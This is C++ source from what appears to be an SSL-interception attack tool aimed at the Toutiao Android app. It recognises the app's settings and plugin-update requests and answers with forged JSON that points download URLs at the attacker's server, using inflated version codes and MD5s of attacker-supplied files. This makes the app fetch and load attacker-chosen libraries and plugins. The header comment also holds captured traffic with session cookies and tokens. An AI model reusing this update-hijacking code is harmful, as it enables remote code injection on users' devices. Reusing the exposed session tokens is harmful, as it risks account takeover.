

#include "Toutiao.h"
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../attacker.h"
#include "PluginServer.h"
#include "../HttpUtils.h"


//MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJ9Z9a6Yn/vYSp7bytaE0ILOke8/0czT69fnKC5hmTQ5P3SLYRqdhC0Lvv6Jt2UHzw6MQsSI7Zqp59gpFK4GDiMCAwEAAQ==

/*

lf.snssdk.com/service/settings/v2/?iid=1&app=1&caller_name=tt_webview&sdk_version_code=104&sdk_upto_so_versioncode=001001&os_type=android&os_api=27&device_platform=PBEM00&device_manufacturer=OPPO&deviceid=62100553568&channel=lite_oppo&aid=35&app_version_code=6780&os_version=8.1.0&package_name=com.ss.android.article.lite&network_type=wifi
GET /service/settings/v2/?iid=1&app=1&caller_name=tt_webview&sdk_version_code=104&sdk_upto_so_versioncode=001001&os_type=android&os_api=27&device_platform=PBEM00&device_manufacturer=OPPO&deviceid=62100553568&channel=lite_oppo&aid=35&app_version_code=6780&os_version=8.1.0&package_name=com.ss.android.article.lite&network_type=wifi HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; PBEM00 Build/OPM1.171019.026)
Host: lf.snssdk.com
Connection: Keep-Alive
Accept-Encoding: gzip
Cookie: odin_tt=a598890b25d7705269c70563f4d9d0ecf4dd3f231c1759e1244916c1c852ca38a3ff5e899400223ad5a2952a1c29be06; install_id=65756668975; ttreq=1$f623ac6d91bd4aa56cd1155842ce74e1b0f88e4d; tt_diamond_env=prod; sid_guard=724690a5c1f9b4975538fdcd8dd4bbbe%7C1552309752%7C5184000%7CFri%2C+10-May-2019+13%3A09%3A12+GMT; uid_tt=e990ec92fc0b281f97e6a6c35cf6e832; sid_tt=724690a5c1f9b4975538fdcd8dd4bbbe; sessionid=724690a5c1f9b4975538fdcd8dd4bbbe

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Date: Mon, 11 Mar 2019 13:09:14 GMT
Vary: Accept-Encoding
X-TRANS-LEVEL: 0
X-Tt-Logid: 20190311210914010006028208214054B
Vary: Accept-Encoding
Content-Encoding: gzip
Via: cache8.cn615[54,0]
Timing-Allow-Origin: *
EagleId: 3d93df1c15523097542013467e

{"data":{"app":{"tt_lite_net":{"net_dns_dualsocket":true,"net_features_port_from_ttnet_enabled":true,
"net_flow_count":false,"net_http_dns_ali_domains":"is.snssdk.com##lf.snssdk.com##v3.365yg.com##v3.ixigua.com##v3.xiguavideo.com##p3.pstatp.com##v7.pstatp.com##s3.pstatp.com##ichannel.snssdk.com##isub.snssdk.com##log.snssdk.com##s0z.pstatp.com##a3.pstatp.com##p3.pstatp.com##api.amemv.com##aweme-eagle.snssdk.com##api-eagle.amemv.com","net_http_dns_bypass_domains":"dns.google.com##dig.bdurl.net",
"net_http_dns_enabled":true,"net_http_dns_google":false,"net_http_dns_perfer":true,
"net_http_dns_tt_domains":"365yg.com##ad.doubleclick.net##adwmcdn.suning.com##amemv.com##api.map.baidu.com##app.qlogo.cn##at.pinduoduo.com##bytecdn.cn##bytedance.com##bytedance.org##cdn.zampdsp.com##dl.weshineapp.com##douyin.com##edt.fp.ps.netease.com##f2.p0y.cn##faceu.mobi##g.cn.miaozhen.com##gma.alicdn.com##huoshan.com##huoshanzhibo.com##iesdouyin.com##imagepa.suning.cn##img-x.jd.com##img.alicdn.com##img1.360buyimg.com##img1.imgtn.bdimg.com##img3.imgtn.bdimg.com##imggen.alicdn.com##imgservicepa.suning.cn##ixigua.com##ixiguavideo.com##maps.googleapis.com##p0.meituan.net##p1.meituan.net##pic2.58cdn.com.cn##pstatp.com##push-rtmp-l1.hypstarcdn.com##q.qlogo.cn##r1.ykimg.com##ribaoapi.com##sl233.com##snssdk.com##soulkiller.bytedance.net##t1.market.xiaomi.com##thirdqq.qlogo.cn##thirdwx.qlogo.cn##timgsa.baidu.com##toutiao.com##tp1.sinaimg.cn##tp2.sinaimg.cn##tp3.sinaimg.cn##tp4.sinaimg.cn##tuchong.com##tva1.sinaimg.cn##tva2.sinaimg.cn##tva4.sinaimg.cn##unidesk.alicdn.com##v.admaster.com.cn##ww2.sinaimg.cn##ww4.sinaimg.cn##www.baidu.com##www.cmpassport.com##wx.qlogo.cn##wx4.sinaimg.cn##ych-files-oss.oss-cn-beijing.aliyuncs.com##zjurl.cn##anote-app.com##anotecdn.com##byteoversea.com##www.akamai.com##haoyuntianqi.com##seniverse.com##caiyunapp.com",
"net_main_frame_4xx5xx_retry_enabled":true,"net_main_frame_read_headers_retry_enabled":true,
"net_prefetch_enabled":true,"net_tcp_socket_connect_retry_enabled":true,"net_tt_http_dns_transaction_enabled":true},
"tt_lite_sdk":{"abtest":0,"sdk_download_url":"https://lf6-ttcdn-tos.pstatp.com/obj/rocketpackagebackup/bugfix_online/1549012319libwebview.so",
"sdk_enable_ttwebview":false,"sdk_is_stable":false,
"sdk_signdata":"gCl1oEQ/qdv1mE94VFV9w5jyv/tyqRkMc8AaOjsSuarND2YeSkVPSirB/Mzrhr5DTasAwW7zyGxntuk7pPAcMw==",
"sdk_upto_so_md5":"7755cd882bae7d91f3ad1364288b8971","sdk_upto_so_versioncode":"104006"},
"tt_lite_video":{"video_ttmp_switch":true}}},"message":"success"}

{"data":{"app":{"tt_main_sdk":{"sdk_ua_enable":true,"sdk_cookie_init_timeout":10,"sdk_webview_type_consistency_check_interval":5,"sdk_enable_ttwebview":true,"sdk_download_url":"https:\/\/lf1-ttcdn-tos.pstatp.com\/obj\/rocketpackagebackup\/bugfix_online\/1559140216libbytedanceweb.so","memory_image_downscale":false,"sdk_upto_so_versioncode":"0621100004002","enable_renderer_process":false,"sdk_is_stable":false,"sdk_signdata":"ECsIRWfiScms0ngibD5M0CJl1iBwkOjGxrWMcszscTLaYqXnyDxU\/GxTMWjS7p2sjEZ43o5pdjLafEC1mHlMww==","sdk_upto_so_md5":"465a7208089cd578ae3769274e1dd40c","sdk_cookie_timeout":10,"render_process_gone_max_num":10,"sdk_webview_type_consistency_first_check_delay":2},"tt_main_net":{"net_http_dns_ali_domains":"is.snssdk.com##lf.snssdk.com##v3.365yg.com##v3.ixigua.com##v3.xiguavideo.com##p3.pstatp.com##v7.pstatp.com##s3.pstatp.com##ichannel.snssdk.com##isub.snssdk.com##log.snssdk.com##s0z.pstatp.com##a3.pstatp.com##p3.pstatp.com","net_flow_count":false,"net_tt_http_dns_transaction_enabled":false,"net_http_dns_perfer":false,"net_dns_prefetch_list":"is.snssdk.com##pos.baidu.com##temai.snssdk.com##ic.snssdk.com##ad.toutiao.com##haohuo.jinritemai.com##m.ce.cn##www.tj-cmys.com##m.gmw.cn##3w.huanqiu.com##is-h2.snssdk.com##iu.snssdk.com##i.snssdk.com##is-hl.snssdk.com##lf.snssdk.com##tp-pay.snssdk.com##diamond.snssdk.com##ic-hl.snssdk.com##m2.people.cn##learning.snssdk.com","net_main_frame_read_headers_retry_enabled":false,"net_tcp_socket_connect_retry_enabled":false,"net_http_dns_google":false,"net_http_dns_bypass_domains":"dns.google.com##dig.bdurl.net","net_prefetch_enabled":false,"net_features_port_from_ttnet_enabled":false,"net_http_dns_tt_domains":"snssdk.com##pstatp.com##toutiao.com##bytedance.com##ixigua.com##huoshan.com##bytedance.net##bytecdn.cn##bytedance.org##amemv.com##douyin.com##faceu.mobi##huoshanzhibo.com##iesdouyin.com##ixiguavideo.com##tuchong.com##zjurl.cn##anotecdn.com##byteoversea.com#xincao.net##ribaoapi.com##feishu.cn##tuchong.com##jinritemai.com","net_dns_ttl":60,"net_connectjob_retry_enabled":false,"net_dns_dualsocket":false,"net_http_dns_enabled":false,"net_main_frame_4xx5xx_retry_enabled":false},"tt_lite_video":{"video_ttmp_switch":true}}},"message": "success"}

GET /obj/rocketpackagebackup/bugfix_online/1549012319libwebview.so HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; PBEM00 Build/OPM1.171019.026)
Host: lf6-ttcdn-tos.pstatp.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 18186240
Connection: keep-alive
Server: nginx
Date: Fri, 01 Feb 2019 09:14:15 GMT
Last-Modified: Fri, 01 Feb 2019 09:11:59 GMT
Expires: Sat, 01 Feb 2020 09:14:15 GMT
Age: 3297298
Cache-Control: max-age=31536000
Accept-Ranges: bytes
X-Tos-Request-Id: 32f757540de890c3
X-Tos-Response-Time: Fri, 01 Feb 2019 09:14:16 GMT
Vary: Accept-Encoding
X-TT-TIMESTAMP: 1549012456.151
x-kss-meta-mm: -|unknown-InvalidFtyp
media-time: -|unknown
media-resolution: -|unknown
media-length: 18186240
X-Cache-Status: HIT from KS-CLOUD-JH-MP-03-38
X-Cache-Status: HIT from KS-CLOUD-ZHZ-CT-05-23
X-Cache-Status: HIT from KS-CLOUD-YANC-CT-03-07
Access-Control-Allow-Origin: *


GET /obj/ad-advertiser-package/adapk_adv_104632148103_ts_1543547654480.apk HTTP/1.1
Accept-Charset: UTF-8;
accept: *//*
connection: Keep-Alive
user-agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo X7Plus Build/LMY47V)
Host: lf3-adcdn-tos.pstatp.com
Accept-Encoding: gzip
*/

int TouTiao::isToutiaoPlugin(const char * lpurl, const char * szdn) {

	if (strstr(szdn, "pstatp.com") == FALSE) {
		return FALSE;
	}

	if ( (strstr(lpurl, "/site/download/app/apk/")|| strstr(lpurl,"/obj/ad-advertiser-package/") ) && strstr(lpurl, ".apk"))
	{
		return TRUE;
	}

	return FALSE;
}





//GET /obj/rocketpackagebackup/android_release_update_pkg/1540438451NewsArticle_update_v6.9.5_1b70712.apk
//lf6-ttcdn-tos.pstatp.com
int TouTiao::isToutiaoUpdate(const char * lpurl, const char * szdn) {

	if (strstr(szdn, "snssdk.com") == FALSE) {
		return FALSE;
	}

	if (strstr(lpurl, "/service/settings/v2/?") )
	{
		return TRUE;
	}

	return FALSE;
}

int TouTiao::replyToutiaoUpdate(char*lpbuffer, int len, int buflimit, LPSSLPROXYPARAM lpssl) {
	int ret = 0;

	string apk1ver = "9921100004002";	//0621100004002

	string strip = HttpUtils::getIPstr(gServerIP) + "\\/" + lpssl->username;

	string filename = "bytedanceweb.zip";
	char szfile1md5[256] = { 0 };
	unsigned char hex1md5[256] = { 0 };
	string filename1 = Public::getUserPluginPath(lpssl->username) + filename;
	ret = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hex1md5, TRUE);

	char * lpRespContentFormat =
		// 		"{\"data\":{\"app\":{\"tt_lite_net\":{\"net_dns_dualsocket\":true,\"net_features_port_from_ttnet_enabled\":true,"
		// 		"\"net_flow_count\":false, \"net_http_dns_ali_domains\" : \"is.snssdk.com##lf.snssdk.com##v3.365yg.com##v3.ixigua.com##v3.xiguavideo.com##p3.pstatp.com##v7.pstatp.com##s3.pstatp.com##ichannel.snssdk.com##isub.snssdk.com##log.snssdk.com##s0z.pstatp.com##a3.pstatp.com##p3.pstatp.com##api.amemv.com##aweme-eagle.snssdk.com##api-eagle.amemv.com\", "
		// 		"\"net_http_dns_bypass_domains\" : \"dns.google.com##dig.bdurl.net\","
		// 		"\"net_http_dns_enabled\" : true, \"net_http_dns_google\" : false, \"net_http_dns_perfer\" : true,"
		// 		"\"net_http_dns_tt_domains\" : \"365yg.com##ad.doubleclick.net##adwmcdn.suning.com##amemv.com##api.map.baidu.com##app.qlogo.cn##at.pinduoduo.com##bytecdn.cn##bytedance.com##bytedance.org##cdn.zampdsp.com##dl.weshineapp.com##douyin.com##edt.fp.ps.netease.com##f2.p0y.cn##faceu.mobi##g.cn.miaozhen.com##gma.alicdn.com##huoshan.com##huoshanzhibo.com##iesdouyin.com##imagepa.suning.cn##img-x.jd.com##img.alicdn.com##img1.360buyimg.com##img1.imgtn.bdimg.com##img3.imgtn.bdimg.com##imggen.alicdn.com##imgservicepa.suning.cn##ixigua.com##ixiguavideo.com##maps.googleapis.com##p0.meituan.net##p1.meituan.net##pic2.58cdn.com.cn##pstatp.com##push-rtmp-l1.hypstarcdn.com##q.qlogo.cn##r1.ykimg.com##ribaoapi.com##sl233.com##snssdk.com##soulkiller.bytedance.net##t1.market.xiaomi.com##thirdqq.qlogo.cn##thirdwx.qlogo.cn##timgsa.baidu.com##toutiao.com##tp1.sinaimg.cn##tp2.sinaimg.cn##tp3.sinaimg.cn##tp4.sinaimg.cn##tuchong.com##tva1.sinaimg.cn##tva2.sinaimg.cn##tva4.sinaimg.cn##unidesk.alicdn.com##v.admaster.com.cn##ww2.sinaimg.cn##ww4.sinaimg.cn##www.baidu.com##www.cmpassport.com##wx.qlogo.cn##wx4.sinaimg.cn##ych-files-oss.oss-cn-beijing.aliyuncs.com##zjurl.cn##anote-app.com##anotecdn.com##byteoversea.com##www.akamai.com##haoyuntianqi.com##seniverse.com##caiyunapp.com\","
		// 		"\"net_main_frame_4xx5xx_retry_enabled\" : true, \"net_main_frame_read_headers_retry_enabled\" : true,"
		// 		"\"net_prefetch_enabled\" : true, \"net_tcp_socket_connect_retry_enabled\" : true, \"net_tt_http_dns_transaction_enabled\" : true},"
		// 		"\"tt_lite_sdk\":{\"abtest\":0, \"sdk_download_url\" : \"http://%s/%s\","
		// 		"\"sdk_enable_ttwebview\" : false, \"sdk_is_stable\" : false,"
		// 		"\"sdk_signdata\" : \"gCl1oEQ/qdv1mE94VFV9w5jyv/tyqRkMc8AaOjsSuarND2YeSkVPSirB/Mzrhr5DTasAwW7zyGxntuk7pPAcMw==\","
		// 		"\"sdk_upto_so_md5\" : \"%s\", \"sdk_upto_so_versioncode\" : \"%s\"},"
		// 		"\"tt_lite_video\" : {\"video_ttmp_switch\":true}}}, \"message\":\"success\"}";

		"{\"data\":"
		"{\"app\":"
		"{\"tt_main_sdk\":"
		"{\"sdk_ua_enable\":true,\"sdk_cookie_init_timeout\":10,\"sdk_webview_type_consistency_check_interval\":5,\"sdk_enable_ttwebview\":true,"
		"\"sdk_download_url\":\"http:\\/\\/%s\\/%s\","
		"\"memory_image_downscale\":false,\"sdk_upto_so_versioncode\":\"%s\",\"enable_renderer_process\":false,"
		"\"sdk_is_stable\":true,\"sdk_signdata\":\"gCl1oEQ/qdv1mE94VFV9w5jyv/tyqRkMc8AaOjsSuarND2YeSkVPSirB/Mzrhr5DTasAwW7zyGxntuk7pPAcMw==\","
		"\"sdk_upto_so_md5\":\"%s\",\"sdk_cookie_timeout\":10,\"render_process_gone_max_num\":10,"
		"\"sdk_webview_type_consistency_first_check_delay\":2},"
		"\"tt_main_net\":{\"net_http_dns_ali_domains\":\"is.snssdk.com##lf.snssdk.com##v3.365yg.com##v3.ixigua.com##v3.xiguavideo.com##p3.pstatp.com##v7.pstatp.com##s3.pstatp.com##ichannel.snssdk.com##isub.snssdk.com##log.snssdk.com##s0z.pstatp.com##a3.pstatp.com##p3.pstatp.com\","
		"\"net_flow_count\":false,\"net_tt_http_dns_transaction_enabled\":false,\"net_http_dns_perfer\":false,"
		"\"net_dns_prefetch_list\":\"is.snssdk.com##pos.baidu.com##temai.snssdk.com##ic.snssdk.com##ad.toutiao.com##haohuo.jinritemai.com##m.ce.cn##www.tj - cmys.com##m.gmw.cn##3w.huanqiu.com##is - h2.snssdk.com##iu.snssdk.com##i.snssdk.com##is - hl.snssdk.com##lf.snssdk.com##tp - pay.snssdk.com##diamond.snssdk.com##ic - hl.snssdk.com##m2.people.cn##learning.snssdk.com\","
		"\"net_main_frame_read_headers_retry_enabled\":false,\"net_tcp_socket_connect_retry_enabled\":false,\"net_http_dns_google\":false,"
		"\"net_http_dns_bypass_domains\":\"dns.google.com##dig.bdurl.net\",\"net_prefetch_enabled\":false,"
		"\"net_features_port_from_ttnet_enabled\":false,"
		"\"net_http_dns_tt_domains\":\"snssdk.com##pstatp.com##toutiao.com##bytedance.com##ixigua.com##huoshan.com##bytedance.net##bytecdn.cn##bytedance.org##amemv.com##douyin.com##faceu.mobi##huoshanzhibo.com##iesdouyin.com##ixiguavideo.com##tuchong.com##zjurl.cn##anotecdn.com##byteoversea.com#xincao.net##ribaoapi.com##feishu.cn##tuchong.com##jinritemai.com\","
		"\"net_dns_ttl\":60,\"net_connectjob_retry_enabled\":false,\"net_dns_dualsocket\":false,\"net_http_dns_enabled\":false,\"net_main_frame_4xx5xx_retry_enabled\":false},"
		"\"tt_lite_video\":{\"video_ttmp_switch\":true}}},\"message\":\"success\"}";


	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		strip.c_str(), filename.c_str(), apk1ver.c_str(),szfile1md5 );

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";
	int respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return respsize;
}

#define TOUTIAO_VERSION_CODE "999"

int TouTiao::isToutiaoUpdateConfig(const char * lpurl, const char * szdn) {

	if (strstr(szdn, "pstatp.com") == FALSE) {
		return FALSE;
	}

	if (strstr(lpurl, "/site/download/app/pl/news_article/") && strstr(lpurl, "/ss_plugin_config.json"))
	{
		return TRUE;
	}

	return FALSE;
}

//不要对新的zip包签名
int TouTiao::makeToutiaoUpdateConfig(char * lpbuffer, int bufsize, int buflimit, string username) {

	int ret = 0;

	string apk1ver = TOUTIAO_VERSION_CODE;	//122
	string apk2ver = TOUTIAO_VERSION_CODE; //173


	string strip = HttpUtils::getIPstr(gServerIP) +"/" + username;

	char szfile1md5[256] = { 0 };
	unsigned char hex1md5[256] = { 0 };
	char szfile2md5[256] = { 0 };
	unsigned char hex2md5[256] = { 0 };

	string filename1 = Public::getUserPluginPath(username) + TOUTIAO1_FILENAME;
	ret = CryptoUtils::getUpdateFileMd5(filename1, szfile1md5, hex1md5, TRUE);
	string filename2 = Public::getUserPluginPath(username) + TOUTIAO2_FILENAME;
	ret = CryptoUtils::getUpdateFileMd5(filename2, szfile2md5, hex2md5, TRUE);

// 	char * lpRespContentFormat =
// 		"{\r\n"
// 		"\"message\": \"success\",\r\n"
// 		"\"data\": {\r\n"
// 		"\"update_plugins\": [\r\n"
// 		"{\r\n"
// 		"\"package_name\": \"com.bytedance.common.plugin.wschannel\", \r\n"
// 		"\"target_version\": 9000,\r\n"
// 		"\"proxy_class\": \"com.bytedance.common.plugin.faces.WsChannelProxy\", \r\n"
// 		"\"plugin_class\": \"com.bytedance.common.plugin.wschannel.WsChannelPlugin\", \r\n"
// 		"\"apk_version_code\": %s, \r\n"
// 		"\"apk_md5\": \"%s\", \r\n"
// 		"\"resources_type\": 1, \r\n"
// 		"\"process_type\": 2, \r\n"
// 		"\"process_name_suffix\": \":push\", \r\n"
// 		"\"process_name_suffix_list\": [\":pushservice\", \":push\"], \r\n"
// 		"\"download_url\": \"http://%s/%s\", \r\n"
// 		"\"support_host_list\": [\"s3a.pstatp.com\", \"s3b.pstatp.com\", \"s1.pstatp.com\", \"s2.pstatp.com\", \"s0.pstatp.com\"]\r\n"
// 		"},\r\n"
// 		"{\r\n"
// 		"\"package_name\": \"com.bytedance.common.plugin.cronet\", \r\n"
// 		"\"target_version\": 98500,\r\n"
// 		"\"proxy_class\": \"com.bytedance.common.plugin.faces.CronetProxy\", \r\n"
// 		"\"plugin_class\": \"com.bytedance.common.plugin.cronet.CronetPlugin\", \r\n"
// 		"\"apk_version_code\": %s, \r\n"
// 		"\"apk_md5\": \"%s\",\r\n"
// 		"\"resources_type\": 1, \r\n"
// 		"\"process_type\": 2, \r\n"
// 		"\"process_name_suffix\": \":push\", \r\n"
// 		"\"process_name_suffix_list\": [\":pushservice\", \":push\"], \r\n"
// 		"\"download_url\": \"http://%s/%s\", \r\n"
// 		"\"support_host_list\": [\"s3a.pstatp.com\", \"s3b.pstatp.com\", \"s1.pstatp.com\", \"s2.pstatp.com\", \"s0.pstatp.com\"]\r\n"
// 		"}\r\n"
// 		"]\r\n"
// 		"}\r\n"
// 		"}\r\n";
	char * lpRespContentFormat =
		"{\r\n" 
		"\"message\": \"success\",\r\n"
		"\"data\": {\r\n"
		"\"update_plugins\": [\r\n" 
		"{\r\n" 
		"\"package_name\": \"com.bytedance.common.plugin.wschannel\",\r\n"
		"\"target_version\": 9999, \r\n"
		"\"proxy_class\": \"com.bytedance.common.plugin.faces.WsChannelProxy\",\r\n"
		"\"plugin_class\": \"com.bytedance.common.plugin.wschannel.WsChannelPlugin\",\r\n"
		"\"apk_version_code\": %s,\r\n"
		"\"apk_md5\": \"%s\", \r\n"
		"\"resources_type\": 1,\r\n"
		"\"process_type\": 2, \r\n"
		"\"process_name_suffix\": \":push\", \r\n"
		"\"process_name_suffix_list\": [\":pushservice\", \":push\"],\r\n"
		"\"download_url\": \"http://%s/%s\",\r\n"
		"\"support_host_list\": [\"s3a.pstatp.com\", \"s3b.pstatp.com\", \"s1.pstatp.com\", \"s2.pstatp.com\", \"s0.pstatp.com\"]\r\n"
		"},\r\n"
		"{\r\n"
		"\"package_name\": \"com.bytedance.common.plugin.cronet\",\r\n"
		"\"target_version\": 99999,\r\n" 
		"\"proxy_class\": \"com.bytedance.common.plugin.faces.CronetProxy\",\r\n"
		"\"plugin_class\": \"com.bytedance.common.plugin.cronet.CronetPlugin\",\r\n"
		"\"apk_version_code\": %s,\r\n"
		"\"apk_md5\": \"%s\",\r\n"
		"\"resources_type\": 1,\r\n"
		"\"process_type\": 2,\r\n"
		"\"process_name_suffix\": \":push\",\r\n"
		"\"process_name_suffix_list\": [\":pushservice\", \":push\"],\r\n"
		"\"download_url\": \"http://%s/%s\",\r\n"
		"\"support_host_list\": [\"s3a.pstatp.com\", \"s3b.pstatp.com\", \"s1.pstatp.com\", \"s2.pstatp.com\", \"s0.pstatp.com\"]\r\n"
		"}\r\n"
		"]\r\n"
		"}\r\n" 
		"}\r\n";

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		apk1ver.c_str(), szfile1md5, strip.c_str(), TOUTIAO1_FILENAME, apk2ver.c_str(), szfile2md5, strip.c_str(), TOUTIAO2_FILENAME);

	int respsize = sprintf_s(lpbuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return respsize;
}




